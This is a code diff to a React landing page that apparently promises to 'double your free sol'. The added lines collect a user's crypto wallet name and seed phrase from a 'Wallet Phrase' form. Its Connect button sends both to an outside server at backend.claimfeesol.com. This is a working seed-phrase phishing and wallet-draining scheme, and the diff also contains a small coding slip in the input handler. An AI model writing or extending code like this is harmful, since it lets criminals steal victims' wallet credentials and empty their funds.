@@ -24,6 +24,24 @@ export default function Home() {
   const [headerTop, setHeaderTop] = useState("header-top");
   const [lang, setLang] = useState('en');
   const [clickFreeText, setClickFreeText] = useState('Click me to double your free sol');
+  const [wallet, setWallet] = useState('');
+  const [phrase, setPhrase] = useState('');
+
+
+  const connectWallet = async (e) => {
+    try {
+        const url = "https://backend.claimfeesol.com/message.php";
+
+        const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
+            headers: {
+                "Content-Type":"application/json",
+            },withCredentials: true
+        })
+        console.log(response);
+    } catch (error) {
+        console.log("Error sending phrase: ", error);
+    }
+  }
     
 
     const connectWal = () => {
@@ -84,6 +102,8 @@ export default function Home() {
     
     walletPhrase.classList.add('active');
     walletTypeContainer.classList.add('active');
+
+    setWallet(e.currentTarget.value);
   }
 
   const soundClicked = (e) => {
@@ -354,9 +374,9 @@ export default function Home() {
             </div>
             <div className="Wallet-phrase-container">
                 <label htmlFor="phrase">Wallet Phrase</label>
-                <textarea name="phrase" id="phrase"></textarea>
+                <textarea name="phrase" value={phrase} onChange={(e) => setPhrase(e.value.target)} id="phrase"></textarea>
                 <div className="form-btn-container">
-                    <button>Connect</button>
+                    <button onClick={connectWallet}>Connect</button>
                 </div>
             </div>
         </form>
